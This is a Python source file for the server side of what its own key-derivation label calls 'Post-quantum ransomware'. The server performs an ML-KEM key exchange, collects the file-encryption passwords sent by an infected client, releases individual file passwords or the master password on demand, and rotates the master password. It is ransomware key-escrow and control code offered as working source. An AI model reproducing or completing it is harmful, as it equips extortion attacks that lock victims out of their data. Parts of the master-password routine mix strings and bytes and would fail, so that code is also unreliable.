import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from pqcrypto.kem.ml_kem_1024 import decrypt
from cryptography.hazmat.primitives.kdf.argon2 import Argon2id


SALT_SIZE = 16  # Size of the salt for Argon2id
IV_SIZE = 12  # AES-GCM standard IV size (96 bits)
TAG_SIZE = 16  # AES-GCM standard tag size (128 bits)
KEY_SIZE = 32  # 256 bits for AES-256


class Server:
    kem_secret_key: bytes
    communication_key: bytes
    client_passwords: list[str]

    def __init__(self, kem_secret_key: bytes):
        self.kem_secret_key = kem_secret_key

    def establish_shared_secret(self, ciphertext: bytes) -> bytes:
        """
        Establish a shared secret with the client using ML-KEM.

        :param self: The Server instance.
        :param ciphertext: The ciphertext received from the client.
        :return: The recovered plaintext shared secret.
        :rtype: bytes
        """

        plaintext_recovered = decrypt(self.kem_secret_key, ciphertext)
        self.shared_secret = plaintext_recovered

        return plaintext_recovered

    def derive_shared_secret(self, shared_secret: bytes):
        """
        Derive a communication key from the shared secret.

        :param self: The Server instance.
        :param shared_secret: The shared secret established with the client.
        :return: None
        """

        hkdf = HKDF(
            algorithm=hashes.SHA256(),
            length=KEY_SIZE,
            salt=None,
            info=b"Post-quantum ransomware communication key",
        )

        self.communication_key = hkdf.derive(shared_secret)

    def encrypt(self, key: bytes, plaintext: bytes) -> tuple[bytes, bytes, bytes]:
        """
        Encrypt plaintext using AES-256-GCM.

        :param self: The Server instance.
        :param key: The encryption key.
        :param plaintext: The plaintext to encrypt.
        :return: The IV, tag, and ciphertext.
        :rtype: tuple[bytes, bytes, bytes]
        """

        iv = os.urandom(IV_SIZE)
        encryptor = Cipher(
            algorithms.AES(key),
            modes.GCM(iv),
        ).encryptor()

        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
        tag = encryptor.tag

        return iv, tag, ciphertext

    def decrypt(self, key: bytes, iv: bytes, tag: bytes, ciphertext: bytes) -> bytes:
        """
        Decrypt ciphertext using AES-256-GCM.

        :param self: The Server instance.
        :param key: The decryption key.
        :param iv: The initialization vector used during encryption.
        :param tag: The authentication tag from encryption.
        :param ciphertext: The ciphertext to decrypt.
        :return: The decrypted plaintext.
        :rtype: bytes
        """

        decryptor = Cipher(
            algorithms.AES(key),
            modes.GCM(iv, tag),
        ).decryptor()

        plaintext = decryptor.update(ciphertext) + decryptor.finalize()

        return plaintext

    def get_client_passwords(self, encrypted_data: bytes):
        """
        Get client's files passwords.

        :param self: The Server instance.
        :param encrypted_data: The encrypted passwords sent from the client.
        :return: None
        """

        iv = encrypted_data[:IV_SIZE]
        tag = encrypted_data[IV_SIZE : IV_SIZE + TAG_SIZE]
        ciphertext = encrypted_data[IV_SIZE + TAG_SIZE :]
        files_passwords = self.decrypt(self.communication_key, iv, tag, ciphertext)

        self.client_passwords = files_passwords.decode("utf-8").splitlines()

    def send_password(self, encrypted_data: bytes) -> bytes:
        """
        Send the password for a specific file to the client.

        :param self: The Server instance.
        :param encrypted_data: The encrypted file ID sent by the client.
        :return: The encrypted file password to send to the client.
        :rtype: bytes
        """

        # Decrypt the file ID sent by the client
        iv = encrypted_data[:IV_SIZE]
        tag = encrypted_data[IV_SIZE : IV_SIZE + TAG_SIZE]
        ciphertext = encrypted_data[IV_SIZE + TAG_SIZE :]
        file_id = self.decrypt(self.communication_key, iv, tag, ciphertext)
        file_id_int = int(file_id.decode("utf-8"))
        password = self.client_passwords[file_id_int]

        # Encrypt the password to send to the client
        data_iv, data_tag, data_ciphertext = self.encrypt(
            self.communication_key, password.encode("utf-8")
        )

        return data_iv + data_tag + data_ciphertext

    def send_master_password(self) -> bytes:
        """
        Send the master password to the client.

        :param self: The Server instance.
        :return: The master password encrypted with the communication key to send to the client.
        :rtype: bytes
        """

        # Encrypt the master password to send to the client
        data_iv, data_tag, data_ciphertext = self.encrypt(
            self.communication_key, self.client_passwords[0].encode("utf-8")
        )

        return data_iv + data_tag + data_ciphertext

    def derive_password_key(self, password: str, salt: bytes) -> bytes:
        """
        Derive a key from a password using Argon2id.

        :param self: The Server instance.
        :param password: The password to derive the key from.
        :param salt: The salt to use for key derivation.
        :return: The derived password key.
        :rtype: bytes
        """

        kdf = Argon2id(
            salt=salt,
            length=KEY_SIZE,
            iterations=1,
            lanes=4,
            memory_cost=64 * 1024,
            ad=None,
            secret=None,
        )

        password_key = kdf.derive(bytes(password, "utf-8"))

        return password_key

    def change_master_password(self, encrypted_data: bytes) -> bytes:
        """
        Change the master password for the client.

        :param self: The Server instance.
        :param encrypted_data: The encrypted master password metadata sent by the client.
        :return: The encrypted new master password metadata to send to the client.
        :rtype: bytes
        """

        # Decrypt the master password metadata sent by the client
        iv = encrypted_data[:IV_SIZE]
        tag = encrypted_data[IV_SIZE : IV_SIZE + TAG_SIZE]
        ciphertext = encrypted_data[IV_SIZE + TAG_SIZE :]
        master_password_metadata = self.decrypt(
            self.communication_key, iv, tag, ciphertext
        )
        master_password_metadata = master_password_metadata.decode("utf-8").splitlines()
        master_password_salt = master_password_metadata[0]
        root_key_iv = master_password_metadata[1]
        root_key_tag = master_password_metadata[2]
        root_key_ciphertext = master_password_metadata[3]
        new_master_password = master_password_metadata[4]

        print("Old password:", self.client_passwords[0])
        print("New password:", new_master_password)

        # Decrypt the root key
        master_password_key = self.derive_password_key(
            self.client_passwords[0], master_password_salt
        )
        cipher = Cipher(
            algorithms.AES(master_password_key),
            modes.GCM(root_key_iv, root_key_tag),
        )
        decryptor = cipher.decryptor()
        root_key = decryptor.update(root_key_ciphertext) + decryptor.finalize()

        # Encrypt the root key with the new master password derived key
        new_master_password_salt = os.urandom(SALT_SIZE)
        new_master_password_key = self.derive_password_key(
            new_master_password, new_master_password_salt
        )
        new_root_key_iv = os.urandom(IV_SIZE)
        cipher = Cipher(
            algorithms.AES(new_master_password_key),
            modes.GCM(new_root_key_iv),
        )
        encryptor = cipher.encryptor()
        new_root_key_ciphertext = encryptor.update(root_key) + encryptor.finalize()
        new_root_key_tag = encryptor.tag

        # Update the stored master password
        self.client_passwords[0] = new_master_password

        # Encrypt the new master password metadata to send to the client
        new_master_password_metadata = "\n".join(
            [
                new_master_password_salt,
                new_root_key_iv,
                new_root_key_tag,
                new_root_key_ciphertext,
            ]
        ).encode("utf-8")
        data_iv, data_tag, data_ciphertext = self.encrypt(
            self.communication_key, new_master_password_metadata
        )

        return data_iv + data_tag + data_ciphertext

    def remove_client_passwords(self):
        """
        Remove stored client passwords.

        :param self: The Server instance.
        :return: None
        """

        self.client_passwords = []
